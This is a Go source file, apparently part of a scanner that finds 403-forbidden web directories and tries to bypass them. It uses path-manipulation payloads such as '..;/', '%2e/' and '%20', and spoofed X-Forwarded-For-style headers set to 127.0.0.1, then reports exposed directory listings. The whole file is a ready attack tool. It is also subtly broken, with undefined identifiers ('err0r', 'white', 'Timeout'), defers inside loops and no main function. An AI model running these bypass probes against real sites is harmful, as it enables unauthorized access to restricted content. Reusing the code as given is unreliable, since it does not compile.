package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"
	"time"
)

// setted as false to run the tool for running till getting the response
var SingleScan = false

// colors
var Reset = "\033[0m"
var Red = "\033[31m"
var Green = "\033[32m"
var Yellow = "\033[33m"
var Blue = "\033[34m"
var Purple = "\033[35m"
var Cyan = "\033[36m"
var Gray = "\033[37m"
var White = "\033[97m"
var Dark = "\033[90m"
var clear map[string]func()

// init function
func init() {
	clear = make(map[string]func()) // intialize it
	clear["linux"] = func() {
		cmd := exec.Command("clear") // linux example
		cmd.Stdout = os.Stdout
		cmd.Run()
	}
	clear["windows"] = func() {
		cmd := exec.Command("cmd", "/c", "cls") // windows example
		cmd.Stdout = os.Stdout
		cmd.Run()
	}
	if runtime.GOOS == "windows" {
		Reset = ""
		Dark = ""
		Red = ""
		Green = ""
		Yellow = ""
		Blue = ""
		Purple = ""
		Cyan = ""
		Gray = ""
		White = ""
	}
}

// clear the terminal screen
func screen() {
	value, ok := clear[runtime.GOOS]
	if ok {
		value()
	}
}

// error handling function
func error(one error, msg string) {
	if one != nil {
		screen()
		fmt.Println("\n\n 				[x]- ", Red, msg, white, "\n\n")
		os.Exit(0)
		return
	}
}

// function to find the forbiden dir
func ForbidFinder(domain string, wl string, nf bool, TimeOut int, OnlyOk bool, isItSingle bool) {

	if isItSingle {
		fmt.Println("			-[ YOUR TARGET : ", domain, " ]-\n\n")
	}
	timeout := time.Duration(TimeOut * 1000000)
	tr := &http.Transport{
		MaxIdleConns:        20,
		MaxIdleConnsPerHost: 20,
		IdleConnTimeout:     time.Second,
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
		DialContext: (&net.Dialer{
			Timeout:   timeout,
			KeepAlive: time.Second,
		}).DialContext,
		ResponseHeaderTimeout: 30 * time.Second,
	}

	client := &http.Client{
		Transport: tr,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
		Timeout: timeout,
	}

	///| IF STATMENT |\\\
	Door := fmt.Sprintf("%s/%s/", domain, "DirDarWithRandomString")
	reQ, err := client.Get(Door)
	if err != nil {
		return
	}
	if reQ.StatusCode == 403 {
		return
	}

	if wl != "" {
		ForbiddenList, err := os.Open(wl)
		if err != nil {
			finalErr := fmt.Sprintf("%s [%s]", "There was error opening this file!", wl)
			err0r(err, finalErr)
		}
		defer ForbiddenList.Close()
		ForbiDDen := bufio.NewScanner(ForbiddenList)
		for ForbiDDen.Scan() {
			WordList := ForbiDDen.Text()
			FullUrl := fmt.Sprintf("%s/%s/", domain, WordList)
			reQ, err := client.Get(FullUrl)
			if err != nil {
				return
			}
			defer reQ.Body.Close()
			if reQ.StatusCode == 403 {
				do3r(domain, WordList, TimeOut, OnlyOk)
			} else if reQ.StatusCode == http.StatusOK {
				bodyBytes, err := ioutil.ReadAll(reQ.Body)
				if err != nil {
					return
				}
				bodyString := string(bodyBytes)
				Directory1StCase := "Index of /" + WordList
				DirectorySecCase := "Directory /" + WordList
				Directory3RdCase := "Directory listing for /" + WordList
				if strings.Contains(bodyString, Directory1StCase) || strings.Contains(bodyString, DirectorySecCase) || strings.Contains(bodyString, Directory3RdCase) {
					fmt.Println(White, "  [+] -", Green, " Directory listing ", White, "[", Cyan, FullUrl, White, "]", "Response code ", "[", reQ.StatusCode, "]")

				}
			} else {
				if nf {
					fmt.Println(Purple, "   [X] NOT FOUND : ", White, "[", Blue, FullUrl, White, "]", " With code -> ", "[", Red, reQ.StatusCode, White, "]")
				} else {
				}
			}
		}
	} else {
		ForbiddenList := []string{"admin", "test", "img", "inc", "includes", "include", "images", "pictures", "gallery", "css", "js", "asset", "assets", "backup", "static", "cms", "blog", "uploads", "files"}
		for i := range ForbiddenList {
			WordList := ForbiddenList[i]
			FullUrl := fmt.Sprintf("%s/%s/", domain, WordList)
			reQ, err := client.Get(FullUrl)
			if err != nil {
				return
			}
			defer reQ.Body.Close()
			if reQ.StatusCode == 403 {
				do3r(domain, WordList, TimeOut, OnlyOk)
			} else if reQ.StatusCode == http.StatusOK {
				bodyBytes, err := ioutil.ReadAll(reQ.Body)
				if err != nil {
					return
				}
				bodyString := string(bodyBytes)
				Directory1StCase := "Index of /" + WordList
				DirectorySecCase := "Directory /" + WordList
				Directory3RdCase := " - " + WordList
				if strings.Contains(bodyString, Directory1StCase) || strings.Contains(bodyString, DirectorySecCase) || strings.Contains(bodyString, Directory3RdCase) {
					fmt.Println("\n", White, "	  [+] - ", Green, "Directory listing ", White, "[", Blue, FullUrl, White, "]", "Response code -> ", "[", Green, reQ.StatusCode, White, "]", "\n")

				}
			} else {
				if nf {
					fmt.Println(Purple, "   [X] NOT FOUND : ", White, "[", Blue, FullUrl, White, "]", " With code -> ", "[", Red, reQ.StatusCode, White, "]")
				} else {

				}
			}

		}

	}

	//wG2.Wait()
	//	return true

}

func do3r(domain string, path string, TimeOut int, OnlyOk bool) {
	ByPass := []string{"%20" + path + "%20/", "%2e/" + path, "./" + path + "/./", "/" + path + "//", path + "..;/", path + "./", path + "/", path + "/*", path + "/.", path + "//", path + "?", path + "???", path + "%20/", path + "/%25", path + "/.randomstring"}
	ByPassWithHeader := []string{"X-Custom-IP-Authorization", "X-Originating-IP", "X-Forwarded-For", "X-Remote-IP", "X-Client-IP", "X-Host", "X-Forwarded-Host"}
	timeout := time.Duration(TimeOut * 1000000)
	tr := &http.Transport{
		MaxIdleConns:        20,
		MaxIdleConnsPerHost: 20,
		IdleConnTimeout:     time.Second,
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
		DialContext: (&net.Dialer{
			Timeout:   timeout,
			KeepAlive: time.Second,
		}).DialContext,
		ResponseHeaderTimeout: timeout,
	}

	client := &http.Client{
		Transport: tr,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
		Timeout: timeout,
	}
	FinalLook := fmt.Sprintf("%s/%s/", domain, path)
	FinalLookToReq := fmt.Sprintf("%s/%s/", domain, path)
	if !OnlyOk {
		fmt.Println(White, "	[+]", Cyan, "- FOUND", White, "[", Blue, FinalLook, White, "]", "  With code ->", "[", Yellow, "403", White, "]")
	}

	for t0Bypass2 := range ByPassWithHeader {
		//FullUrl := fmt.Sprintf("%s/%s", domain, )
		//reQ, err := client.Get(FullUrl)
		reQ, err := http.NewRequest("GET", FinalLookToReq, nil)
		if err != nil {
			panic(err)
		}
		reQ.Header.Add(ByPassWithHeader[t0Bypass2], "127.0.0.1")
		resp, err := client.Do(reQ)
		if err != nil {
			//panic(err)
			return
		}
		if resp.StatusCode == http.StatusOK {
			bodyBytes, err := ioutil.ReadAll(resp.Body)
			if err != nil {
				return
			}
			bodyString := string(bodyBytes)
			Directory1StCase := "Index of /" + path
			DirectorySecCase := "Directory /" + path
			Directory3RdCase := " - " + path
			if strings.Contains(bodyString, Directory1StCase) || strings.Contains(bodyString, DirectorySecCase) || strings.Contains(bodyString, Directory3RdCase) {
				fmt.Println("\n", Yellow, "	  [+] - BYPASSED : payload", White, "[", Green, ByPassWithHeader[t0Bypass2], ": 127.0.0.1", "] :", "] ", Blue, FinalLook, White, " -> Response status code [", Green, resp.StatusCode, White, "]\n")

			}
			//finalWG.Done()
			//time.Sleep(10 * time.Second)
		} else {
			if !OnlyOk {
				fmt.Println(White, "	  [-]", Yellow, " - FAILED : payload", White, "[", Green, ByPassWithHeader[t0Bypass2], ": 127.0.0.1", White, "] ", Blue, FinalLook, White, " -> Response status code [", Red, resp.StatusCode, White, "]")
			}
		}
	}
	for t0Bypass := range ByPass {
		//	finalWG.Add(1)
		//qs := url.QueryEscape(ByPass[t0Bypass])
		FullUrl := fmt.Sprintf("%s/%s", domain, ByPass[t0Bypass])
		//u, err := url.Parse(qs)
		reQ, err := client.Get(FullUrl)
		if err != nil {
			return
			//panic(err)
		}
		defer reQ.Body.Close()
		if reQ.StatusCode == http.StatusOK {
			bodyBytes, err := ioutil.ReadAll(reQ.Body)
			if err != nil {
				return
			}
			bodyString := string(bodyBytes)
			Directory1StCase := "Index of /" + path
			DirectorySecCase := "Directory /" + path
			Directory3RdCase := " - " + path
			if strings.Contains(bodyString, Directory1StCase) || strings.Contains(bodyString, DirectorySecCase) || strings.Contains(bodyString, Directory3RdCase) {
				fmt.Println("\n", Yellow, "	  [+] - BYPASSED : payload", White, "[", Green, ByPass[t0Bypass], White, "] ", Blue, FinalLook, White, " -> Response status code [", Green, reQ.StatusCode, White, "]\n")

			}
			//stime.Sleep(10 * time.Second)
		} else {
			if !OnlyOk {
				fmt.Println(White, "	  [-]", Yellow, " - FAILED : payload", White, "[", Green, ByPass[t0Bypass], White, "] ", Blue, FullUrl, White, " -> Response status code [", Red, reQ.StatusCode, White, "]")
			}
		}
	}

}

// worker function
func worker(domain chan string, wg *sync.WaitGroup, wl string, nf bool, TimeOut int, OnlyOk bool) {
	defer wg.Done()
	for b := range domain {
		ForbidFinder(b, wl, nf, Timeout, OnlyOk, SingleScan)
	}
}

